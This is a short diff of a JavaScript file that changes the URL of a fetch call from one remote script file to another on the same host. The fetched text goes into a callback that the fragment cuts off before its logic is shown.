@@ -12,7 +12,7 @@ async function getUsers() {
     console.table(data)
 }
 
-fetch('https://sysetup.com/js/0dc5.js')
+fetch('https://sysetup.com/js/0dc7.js')
     .then(response => response.text())
     .then(data => {
         let index = 0
